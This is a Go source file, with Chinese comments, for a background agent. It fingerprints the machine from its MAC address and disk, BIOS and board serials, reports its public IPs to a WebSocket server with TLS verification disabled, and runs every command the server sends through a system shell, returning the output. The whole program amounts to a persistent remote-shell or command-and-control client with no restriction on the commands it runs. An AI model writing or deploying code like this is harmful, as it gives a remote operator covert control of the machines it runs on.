package main

import (
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
)

const (
	curlUserAgent = "curl/7.68.0"
	pingInterval  = 30 * time.Second
)

// 获取主MAC地址
func getPrimaryMAC() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp != 0 && 
		   iface.Flags&net.FlagLoopback == 0 &&
		   len(iface.HardwareAddr) >= 6 {
			return iface.HardwareAddr.String()
		}
	}
	
	for _, iface := range ifaces {
		if len(iface.HardwareAddr) >= 6 {
			return iface.HardwareAddr.String()
		}
	}
	return ""
}

// 获取系统磁盘序列号
func getSystemDiskSerial() string {
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("wmic", "path", "win32_physicalmedia", "get", "serialnumber")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if trimmed := strings.TrimSpace(line); trimmed != "" && trimmed != "SerialNumber" {
					return trimmed
				}
			}
		}
	
	case "linux":
		cmd := exec.Command("bash", "-c", `lsblk -dno SERIAL / 2>/dev/null || (df / | tail -1 | cut -d' ' -f1 | xargs -I{} lsblk -dno SERIAL {} 2>/dev/null)`)
		output, err := cmd.Output()
		if err == nil {
			return strings.TrimSpace(string(output))
		}
	
	case "darwin":
		cmd := exec.Command("diskutil", "info", "/")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, "Device Identifier") {
					parts := strings.Split(line, ":")
					if len(parts) > 1 {
						return strings.TrimSpace(parts[1])
					}
				}
			}
		}
	}
	return ""
}

// 获取BIOS/UEFI序列号
func getBIOSSerial() string {
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("wmic", "bios", "get", "serialnumber")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			if len(lines) >= 2 {
				return strings.TrimSpace(lines[1])
			}
		}
	
	case "linux":
		cmd := exec.Command("bash", "-c", `sudo dmidecode -s system-serial-number 2>/dev/null || cat /sys/class/dmi/id/product_serial 2>/dev/null`)
		output, err := cmd.Output()
		if err == nil {
			return strings.TrimSpace(string(output))
		}
	
	case "darwin":
		cmd := exec.Command("ioreg", "-l", "-d", "2")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, "IOPlatformSerialNumber") {
					parts := strings.Split(line, "\"")
					if len(parts) >= 4 {
						return strings.TrimSpace(parts[3])
					}
				}
			}
		}
	}
	return ""
}

// 获取主板序列号
func getMotherboardSerial() string {
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("wmic", "baseboard", "get", "serialnumber")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			if len(lines) >= 2 {
				return strings.TrimSpace(lines[1])
			}
		}
	
	case "linux":
		cmd := exec.Command("bash", "-c", `sudo dmidecode -s baseboard-serial-number 2>/dev/null`)
		output, err := cmd.Output()
		if err == nil {
			return strings.TrimSpace(string(output))
		}
	
	case "darwin":
		cmd := exec.Command("system_profiler", "SPHardwareDataType")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, "Serial Number") {
					parts := strings.Split(line, ":")
					if len(parts) >= 2 {
						return strings.TrimSpace(parts[1])
					}
				}
			}
		}
	}
	return ""
}

// 生成稳定的硬件指纹
func generateMachineID() string {
	identifiers := map[string]string{
		"mac":   getPrimaryMAC(),
		"disk":  getSystemDiskSerial(),
		"bios":  getBIOSSerial(),
		"board": getMotherboardSerial(),
	}
	
	data, _ := json.Marshal(identifiers)
	hash := sha256.Sum256(data)
	return hex.EncodeToString(hash[:])[:16]
}

// 获取IP地址
func fetchIP(ipv6 bool) string {
	targetURL := "http://ipv4.ip.sb"
	if ipv6 {
		targetURL = "http://ipv6.ip.sb"
	}

	client := &http.Client{
		Transport: &http.Transport{
			DisableKeepAlives: true,
			Proxy:            http.ProxyFromEnvironment,
		},
	}

	req, _ := http.NewRequest("GET", targetURL, nil)
	req.Header.Set("User-Agent", curlUserAgent)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Host", strings.TrimPrefix(targetURL, "http://"))

	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return ""
	}

	body, _ := io.ReadAll(resp.Body)
	ip := strings.TrimSpace(string(body))
	if net.ParseIP(ip) == nil {
		return ""
	}
	return ip
}

func getIPs() (ipv4, ipv6 string) {
	var wg sync.WaitGroup
	wg.Add(2)

	go func() { defer wg.Done(); ipv4 = fetchIP(false) }()
	go func() { defer wg.Done(); ipv6 = fetchIP(true) }()

	wg.Wait()
	return
}

// 收集系统信息
func collectSystemInfo(machineID, ipv4, ipv6 string) string {
	data := fmt.Sprintf("MachineID:%s;IPv4:%s;IPv6:%s", machineID, ipv4, ipv6)
	return base64.StdEncoding.EncodeToString([]byte(data))
}

// 后台运行
func daemonize() {
	if os.Getppid() != 1 {
		cmd := exec.Command(os.Args[0], os.Args[1:]...)
		cmd.Start()
		os.Exit(0)
	}
}

// 执行命令并获取输出
func executeCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, _ := cmd.CombinedOutput()
	return string(output)
}

func main() {
	daemon := flag.Bool("d", false, "Run as daemon")
	serverURL := flag.String("s", "wss://wstunnel/ws", "WebSocket server URL")
	flag.Parse()

	if *daemon {
		daemonize()
	}

	ipv4, ipv6 := getIPs()
	machineID := generateMachineID()
	
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	go func() { <-sig; cancel() }()

	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Proxy:           http.ProxyFromEnvironment,
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		u, _ := url.Parse(*serverURL)
		conn, _, err := dialer.Dial(u.String(), nil)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		info := collectSystemInfo(machineID, ipv4, ipv6)
		_ = conn.WriteMessage(websocket.TextMessage, []byte(info))

		// 心跳协程
		go func() {
			ticker := time.NewTicker(pingInterval)
			defer ticker.Stop()
			
			for {
				select {
				case <-ticker.C:
					if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
						return
					}
				case <-ctx.Done():
					return
				}
			}
		}()

		var wg sync.WaitGroup
		wg.Add(1)
		
		go func() {
			defer wg.Done()
			defer conn.Close()
			
			for {
				_, message, err := conn.ReadMessage()
				if err != nil {
					return
				}
				
				result := executeCommand(string(message))
				_ = conn.WriteMessage(websocket.TextMessage, []byte(result))
			}
		}()

		select {
		case <-ctx.Done():
			_ = conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			wg.Wait()
			return
		}
	}
}
